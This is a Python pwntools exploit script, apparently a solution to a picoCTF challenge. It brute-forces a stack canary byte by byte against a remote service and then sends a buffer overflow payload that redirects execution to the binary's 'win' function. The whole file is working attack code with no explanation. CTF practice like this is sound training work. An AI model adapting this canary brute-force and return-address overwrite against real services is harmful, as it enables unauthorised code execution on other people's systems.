from pwn import *

elf = ELF("vuln")


canary = b""

for i in range(4):
    for j in range(256):
        conn = remote("saturn.picoctf.net", 59654)
        length = 0x40 + i + 1
        conn.sendline(str(length))
        payload = b"a" * 0x40
        payload += canary
        payload += int.to_bytes(j)
        conn.sendline(payload)
        resp = conn.recvall()
        if b"Stack Smashing" not in resp:
            canary += int.to_bytes(j)
            print(canary)
            break

conn = remote("saturn.picoctf.net", 59654)
length = 0x58
conn.sendline(str(length))
payload = b"a" * 0x40
payload += canary
payload += b"a" * 16
payload += p32(elf.symbols["win"])
conn.sendline(payload)
conn.interactive()

